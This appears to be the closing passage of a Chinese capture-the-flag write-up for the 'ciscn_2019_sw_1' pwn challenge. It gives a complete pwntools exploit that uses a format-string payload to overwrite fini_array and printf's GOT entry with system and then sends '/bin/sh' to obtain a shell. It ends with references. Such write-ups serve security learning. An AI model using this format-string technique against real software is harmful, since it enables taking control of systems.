   ![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210414232835.png)

   **改写后**：

   ![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210414233127.png)

3. 第二次输入`/bin/sh`获取`shell`：

   ![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210414233250.png)

#### 完整exp

```python
from pwn import *

sh = process("./ciscn_2019_sw_1")
# 往fini.array[0]写main@text, printf@got写system@plt
payload = b"%2052c%13$hn%31692c%14$hn%356c%15$hn" + p32(0x804989c + 2) + p32(0x804989c) + p32(0x804979c)

sh.recvline()

sh.sendline(payload)

sleep(1)

sh.sendline("/bin/sh")
sh.interactive()
```

**远程攻击效果**：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210414233458.png)

# 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://roderickchan.github.io)  
> URL: https://roderickchan.github.io/zh-cn/2021-09-12-ciscn-2019-pwn%E7%B3%BB%E5%88%97/  

